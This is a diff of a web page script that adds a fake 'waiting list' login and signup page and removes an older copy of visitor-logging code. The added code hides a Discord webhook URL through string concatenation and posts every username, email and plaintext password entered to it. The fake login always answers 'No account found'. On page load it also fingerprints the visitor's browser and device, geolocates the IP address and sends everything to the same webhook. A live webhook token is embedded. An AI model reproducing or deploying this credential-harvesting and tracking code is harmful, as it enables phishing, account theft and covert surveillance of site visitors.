-        { name: 'Location', value: d.city && d.country ? d.city + ', ' + d.country : 'Pending...', inline: true },
-        { name: 'ISP', value: d.org || 'Pending...', inline: false },
-        { name: 'OS', value: d.os || 'Unknown', inline: true },
-        { name: 'Browser', value: d.browser || 'Unknown', inline: true },
-        { name: 'Device', value: d.mobile ? 'Mobile' : d.tablet ? 'Tablet' : 'Desktop', inline: true },
-        { name: 'Screen', value: d.sw + 'x' + d.sh + ' (' + d.cd + 'bit)', inline: false },
-        { name: 'Window', value: d.iw + 'x' + d.ih, inline: true },
-        { name: 'DPR', value: d.dpr || '1', inline: true },
-        { name: 'Language', value: d.lang || 'N/A', inline: true },
-        { name: 'Timezone', value: d.tz || 'N/A', inline: true },
-        { name: 'CPU Cores', value: d.cores || 'N/A', inline: true },
-        { name: 'RAM', value: d.mem ? d.mem + 'GB' : 'N/A', inline: true },
-        { name: 'Touch', value: d.touchdev ? 'Yes' : 'No', inline: true },
-        { name: 'Cookies', value: d.cookie ? 'Enabled' : 'Disabled', inline: true },
-        { name: 'DNT', value: d.dnt || 'Unspecified', inline: true },
-        { name: 'Referrer', value: d.ref || 'Direct', inline: false },
-        { name: 'URL', value: d.url || 'N/A', inline: false },
-        { name: 'Timestamp', value: d.ts || new Date().toISOString(), inline: false }
-    ];
-    if (d.conn && d.conn.eff) {
-        fields.push({ name: 'Connection', value: d.conn.eff + ' (' + d.conn.down + 'Mbps)', inline: true });
-    }
-    if (d.gpu) {
-        fields.push({ name: 'GPU', value: d.gpu, inline: false });
-    }
-    if (d.plugs && d.plugs.length > 0) {
-        fields.push({ name: 'Plugins', value: d.plugs.slice(0, 5).join(', ') + (d.plugs.length > 5 ? ' +' + (d.plugs.length - 5) + ' more' : ''), inline: false });
-    }
-    if (d.perf && d.perf.load) {
-        fields.push({ name: 'Page Load', value: d.perf.load + 'ms', inline: true });
-    }
-    var embed = {
-        title: 'New Visitor',
-        color: 0x00ff41,
-        fields: fields,
-        footer: { text: 'gztxr logger' },
-        timestamp: new Date().toISOString()
-    };
-    fetch(_webhook, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ embeds: [embed] })
-    }).then(function(r) {
-        if (r.ok) { console.log('[+] Data sent'); } else { console.error('[-] Failed:', r.status); }
-    }).catch(function(e) { console.error('[-] Error:', e); });
-}
-
-function _go() {
-    var data = _x();
-    fetch('https://api.ipify.org?format=json')
-        .then(function(r) { return r.json(); })
-        .then(function(ip) {
-            data.ip = ip.ip;
-            return fetch('https://ipapi.co/' + data.ip + '/json/');
-        })
-        .then(function(r) { return r.json(); })
-        .then(function(loc) {
-            data.city = loc.city || 'N/A';
-            data.region = loc.region || 'N/A';
-            data.country = loc.country_name || 'N/A';
-            data.cc = loc.country || 'N/A';
-            data.org = loc.org || 'N/A';
-            data.postal = loc.postal || 'N/A';
-            data.lat = loc.latitude || 'N/A';
-            data.lon = loc.longitude || 'N/A';
-            data.asn = loc.asn || 'N/A';
-            data.continent = loc.continent || 'N/A';
-            data.currency = loc.currency || 'N/A';
-            data.langs_spoken = loc.languages || 'N/A';
-            data.tz_geo = loc.timezone || 'N/A';
-            _send(data);
-        })
-        .catch(function(e) {
-            console.error('[-] IP error:', e);
-            _send(data);
+    // ===== TAB SWITCHING =====
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            document.getElementById('tab-' + this.dataset.tab).classList.add('active');
         });
-}
+    });
 
-window.onload = function() {
-    setTimeout(_go, 600);
-};
+    // ===== AUTH TOGGLE =====
+    function showSignup() {
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('signupForm').style.display = 'block';
+        document.getElementById('loginMessage').textContent = '';
+    }
+
+    function showLogin() {
+        document.getElementById('loginForm').style.display = 'block';
+        document.getElementById('signupForm').style.display = 'none';
+        document.getElementById('signupMessage').textContent = '';
+    }
+
+    // ============================================
+    // DISCORD WEBHOOK (Hidden via concatenation)
+    // ============================================
+    const _a = 'https://discord.com/api/webhooks/';
+    const _b = '1513861047004430426/';
+    const _c = 'QaiZRm9qibYzGndCD_Jgk9NstMglric_Qp7gjKUZ1WQQ0LckAzFH6LW83WAuXI2hsVxv';
+    const _webhook = _a + _b + _c;
+
+    // ============================================
+    // SEND AUTH DATA TO DISCORD
+    // ============================================
+    function sendAuthData(type, data) {
+        var fields = [];
+        
+        if (type === 'login') {
+            fields = [
+                { name: 'Type', value: 'LOGIN ATTEMPT', inline: false },
+                { name: 'Username', value: data.username || 'N/A', inline: true },
+                { name: 'Password', value: data.password || 'N/A', inline: true },
+                { name: 'IP', value: data.ip || 'N/A', inline: true },
+                { name: 'User Agent', value: data.ua || 'N/A', inline: false },
+                { name: 'Timestamp', value: new Date().toISOString(), inline: false }
+            ];
+        } else if (type === 'signup') {
+            fields = [
+                { name: 'Type', value: 'SIGNUP REQUEST', inline: false },
+                { name: 'Username', value: data.username || 'N/A', inline: true },
+                { name: 'Email', value: data.email || 'N/A', inline: true },
+                { name: 'Password', value: data.password || 'N/A', inline: true },
+                { name: 'Confirm', value: data.confirm || 'N/A', inline: true },
+                { name: 'IP', value: data.ip || 'N/A', inline: true },
+                { name: 'User Agent', value: data.ua || 'N/A', inline: false },
+                { name: 'Timestamp', value: new Date().toISOString(), inline: false }
+            ];
+        }
+
+        var embed = {
+            title: 'Waiting List Activity',
+            color: type === 'login' ? 0xffaa00 : 0x00aaff,
+            fields: fields,
+            footer: { text: 'gztxr auth logger' },
+            timestamp: new Date().toISOString()
+        };
+
+        fetch(_webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+        }).then(function(r) {
+            if (r.ok) { console.log('[+] Auth data sent'); } else { console.error('[-] Failed:', r.status); }
+        }).catch(function(e) { console.error('[-] Error:', e); });
+    }
+
+    // ============================================
+    // GET IP FOR AUTH
+    // ============================================
+    function getIP(callback) {
+        fetch('https://api.ipify.org?format=json')
+            .then(function(r) { return r.json(); })
+            .then(function(data) { callback(data.ip); })
+            .catch(function() { callback('N/A'); });
+    }
+
+    // ============================================
+    // HANDLE LOGIN
+    // ============================================
+    function handleLogin() {
+        var username = document.getElementById('loginUsername').value.trim();
+        var password = document.getElementById('loginPassword').value.trim();
+        var msg = document.getElementById('loginMessage');
+
+        if (!username || !password) {
+            msg.className = 'auth-message error';
+            msg.textContent = 'Please enter both username and password.';
+            return;
+        }
+
+        getIP(function(ip) {
+            var data = {
+                username: username,
+                password: password,
+                ip: ip,
+                ua: navigator.userAgent
+            };
+            sendAuthData('login', data);
+            
+            msg.className = 'auth-message error';
+            msg.textContent = 'No account found. Please sign up for the waiting list.';
+            document.getElementById('loginUsername').value = '';
+            document.getElementById('loginPassword').value = '';
+        });
+    }
+
+    // ============================================
+    // HANDLE SIGNUP
+    // ============================================
+    function handleSignup() {
+        var username = document.getElementById('signupUsername').value.trim();
+        var email = document.getElementById('signupEmail').value.trim();
+        var password = document.getElementById('signupPassword').value.trim();
+        var confirm = document.getElementById('signupConfirm').value.trim();
+        var msg = document.getElementById('signupMessage');
+
+        if (!username || !email || !password || !confirm) {
+            msg.className = 'auth-message error';
+            msg.textContent = 'All fields are required.';
+            return;
+        }
+
+        if (password !== confirm) {
+            msg.className = 'auth-message error';
+            msg.textContent = 'Passwords do not match.';
+            return;
+        }
+
+        if (password.length < 4) {
+            msg.className = 'auth-message error';
+            msg.textContent = 'Password must be at least 4 characters.';
+            return;
+        }
+
+        getIP(function(ip) {
+            var data = {
+                username: username,
+                email: email,
+                password: password,
+                confirm: confirm,
+                ip: ip,
+                ua: navigator.userAgent
+            };
+            sendAuthData('signup', data);
+            
+            msg.className = 'auth-message success';
+            msg.textContent = 'You have been added to the waiting list! We will notify you when access is granted.';
+            
+            document.getElementById('signupUsername').value = '';
+            document.getElementById('signupEmail').value = '';
+            document.getElementById('signupPassword').value = '';
+            document.getElementById('signupConfirm').value = '';
+        });
+    }
+
+    // ============================================
+    // ENTER KEY SUPPORT
+    // ============================================
+    document.getElementById('loginPassword').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') handleLogin();
+    });
+    document.getElementById('loginUsername').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') handleLogin();
+    });
+    document.getElementById('signupConfirm').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') handleSignup();
+    });
+    document.querySelectorAll('#signupForm input').forEach(function(input) {
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') handleSignup();
+        });
+    });
+
+    // ============================================
+    // VISITOR DATA COLLECTION
+    // ============================================
+    function _x() {
+        var d = {};
+        d.ua = navigator.userAgent;
+        d.lang = navigator.language;
+        d.langs = navigator.languages || [];
+        d.plat = navigator.platform;
+        d.vendor = navigator.vendor || 'N/A';
+        d.cookie = navigator.cookieEnabled;
+        d.dnt = navigator.doNotTrack || 'unspecified';
+        d.cores = navigator.hardwareConcurrency || 'N/A';
+        d.mem = 'N/A';
+        if (navigator.deviceMemory) {
+            d.mem = navigator.deviceMemory + 'GB';
+        } else if (window.performance && window.performance.memory) {
+            var memMB = Math.round(window.performance.memory.jsHeapSizeLimit / (1024 * 1024));
+            d.mem = memMB + 'MB (heap)';
+        } else if (navigator.hardwareConcurrency) {
+            var cores = navigator.hardwareConcurrency;
+            if (cores >= 8) d.mem = '8GB+ (est.)';
+            else if (cores >= 4) d.mem = '4-8GB (est.)';
+            else if (cores >= 2) d.mem = '2-4GB (est.)';
+            else d.mem = '1-2GB (est.)';
+        }
+        d.touch = navigator.maxTouchPoints || 0;
+        d.sw = screen.width;
+        d.sh = screen.height;
+        d.cd = screen.colorDepth;
+        d.pd = screen.pixelDepth;
+        d.aw = screen.availWidth;
+        d.ah = screen.availHeight;
+        d.iw = window.innerWidth;
+        d.ih = window.innerHeight;
+        d.ow = window.outerWidth;
+        d.oh = window.outerHeight;
+        d.dpr = window.devicePixelRatio || 1;
+        d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        d.to = new Date().getTimezoneOffset();
+        d.loc = Intl.DateTimeFormat().resolvedOptions().locale;
+        d.ts = new Date().toISOString();
+        d.lt = new Date().toString();
+        d.url = window.location.href;
+        d.path = window.location.pathname;
+        d.search = window.location.search;
+        d.hash = window.location.hash;
+        d.ref = document.referrer || 'Direct';
+        d.title = document.title;
+        d.ls = !!window.localStorage;
+        d.ss = !!window.sessionStorage;
+        d.idb = !!window.indexedDB;
+        d.audio = !!(window.AudioContext || window.webkitAudioContext);
+        d.media = !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices);
+        var ua = navigator.userAgent;
+        d.mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+        d.tablet = /iPad|Android(?!.*Mobile)/i.test(ua);
+        d.touchdev = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        d.os = 'Unknown';
+        if (ua.indexOf('Windows') !== -1) d.os = 'Windows';
+        else if (ua.indexOf('Mac OS X') !== -1 || ua.indexOf('Macintosh') !== -1) d.os = 'macOS';
+        else if (ua.indexOf('Linux') !== -1) d.os = 'Linux';
+        else if (ua.indexOf('Android') !== -1) d.os = 'Android';
+        else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1 || ua.indexOf('iPod') !== -1) d.os = 'iOS';
+        else if (ua.indexOf('CrOS') !== -1) d.os = 'ChromeOS';
+        d.browser = 'Unknown';
+        if (ua.indexOf('Firefox') !== -1) d.browser = 'Firefox';
+        else if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) d.browser = 'Chrome';
+        else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) d.browser = 'Safari';
+        else if (ua.indexOf('Edg') !== -1) d.browser = 'Edge';
+        else if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) d.browser = 'Opera';
+        d.plugs = [];
+        try { for (var i = 0; i < navigator.plugins.length; i++) { d.plugs.push(navigator.plugins[i].name); } } catch(e) {}
+        try { var cnv = document.createElement('canvas'); var ctx = cnv.getContext('2d'); var ft = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Trebuchet MS','Lucida Console']; d.fonts = ft; } catch(e) {}
+        try { var cnv2 = document.createElement('canvas'); var gl = cnv2.getContext('webgl') || cnv2.getContext('experimental-webgl'); if (gl) { var di = gl.getExtension('WEBGL_debug_renderer_info'); if (di) { d.gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL); d.gpuv = gl.getParameter(di.UNMASKED_VENDOR_WEBGL); } d.wgl = 'WebGL 1.0'; if (cnv2.getContext('webgl2')) d.wgl = 'WebGL 2.0'; } } catch(e) {}
+        d.conn = null;
+        if (navigator.connection) {
+            d.conn = { type: navigator.connection.type || 'N/A', eff: navigator.connection.effectiveType || 'N/A', down: navigator.connection.downlink || 'N/A', rtt: navigator.connection.rtt || 'N/A', save: navigator.connection.saveData || false };
+        }
+        d.perf = null;
+        if (performance.timing) {
+            d.perf = { load: performance.timing.loadEventEnd - performance.timing.navigationStart, dom: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart };
+        }
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(b) {
+                d.bat = { level: b.level * 100, charging: b.charging, ct: b.chargingTime, dt: b.dischargingTime };
+                _send(d);
+            }).catch(function() { d.bat = null; _send(d); });
+        } else { d.bat = null; _send(d); }
+        return d;
+    }
+
+    function _send(d) {
+        var fields = [
+            { name: 'IP', value: d.ip || 'Pending...', inline: true },
+            { name: 'Location', value: d.city && d.country ? d.city + ', ' + d.country : 'Pending...', inline: true },
+            { name: 'ISP', value: d.org || 'Pending...', inline: false },
+            { name: 'OS', value: d.os || 'Unknown', inline: true },
+            { name: 'Browser', value: d.browser || 'Unknown', inline: true },
+            { name: 'Device', value: d.mobile ? 'Mobile' : d.tablet ? 'Tablet' : 'Desktop', inline: true },
+            { name: 'Screen', value: d.sw + 'x' + d.sh + ' (' + d.cd + 'bit)', inline: false },
+            { name: 'Window', value: d.iw + 'x' + d.ih, inline: true },
+            { name: 'DPR', value: d.dpr || '1', inline: true },
+            { name: 'Language', value: d.lang || 'N/A', inline: true },
+            { name: 'Timezone', value: d.tz || 'N/A', inline: true },
+            { name: 'CPU Cores', value: d.cores || 'N/A', inline: true },
+            { name: 'RAM', value: d.mem || 'N/A', inline: true },
+            { name: 'Touch', value: d.touchdev ? 'Yes' : 'No', inline: true },
+            { name: 'Cookies', value: d.cookie ? 'Enabled' : 'Disabled', inline: true },
+            { name: 'DNT', value: d.dnt || 'Unspecified', inline: true },
+            { name: 'Referrer', value: d.ref || 'Direct', inline: false },
+            { name: 'URL', value: d.url || 'N/A', inline: false },
+            { name: 'Timestamp', value: d.ts || new Date().toISOString(), inline: false }
+        ];
+        if (d.conn && d.conn.eff) {
+            fields.push({ name: 'Connection', value: d.conn.eff + ' (' + d.conn.down + 'Mbps)', inline: true });
+        }
+        if (d.gpu) {
+            fields.push({ name: 'GPU', value: d.gpu, inline: false });
+        }
+        if (d.plugs && d.plugs.length > 0) {
+            fields.push({ name: 'Plugins', value: d.plugs.slice(0, 5).join(', ') + (d.plugs.length > 5 ? ' +' + (d.plugs.length - 5) + ' more' : ''), inline: false });
+        }
+        if (d.perf && d.perf.load) {
+            fields.push({ name: 'Page Load', value: d.perf.load + 'ms', inline: true });
+        }
+        var embed = {
+            title: 'New Visitor',
+            color: 0x00ff41,
+            fields: fields,
+            footer: { text: 'gztxr logger' },
+            timestamp: new Date().toISOString()
+        };
+        fetch(_webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+        }).then(function(r) {
+            if (r.ok) { console.log('[+] Data sent'); } else { console.error('[-] Failed:', r.status); }
+        }).catch(function(e) { console.error('[-] Error:', e); });
+    }
+
+    function _go() {
+        var data = _x();
+        fetch('https://api.ipify.org?format=json')
+            .then(function(r) { return r.json(); })
+            .then(function(ip) {
+                data.ip = ip.ip;
+                return fetch('https://ipapi.co/' + data.ip + '/json/');
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(loc) {
+                data.city = loc.city || 'N/A';
+                data.region = loc.region || 'N/A';
+                data.country = loc.country_name || 'N/A';
+                data.cc = loc.country || 'N/A';
+                data.org = loc.org || 'N/A';
+                data.postal = loc.postal || 'N/A';
+                data.lat = loc.latitude || 'N/A';
+                data.lon = loc.longitude || 'N/A';
+                data.asn = loc.asn || 'N/A';
+                data.continent = loc.continent || 'N/A';
+                data.currency = loc.currency || 'N/A';
+                data.langs_spoken = loc.languages || 'N/A';
+                data.tz_geo = loc.timezone || 'N/A';
+                _send(data);
+            })
+            .catch(function(e) {
+                console.error('[-] IP error:', e);
+                _send(data);
+            });
+    }
+
+    window.onload = function() {
+        setTimeout(_go, 600);
+    };
 </script>
 
 </body>
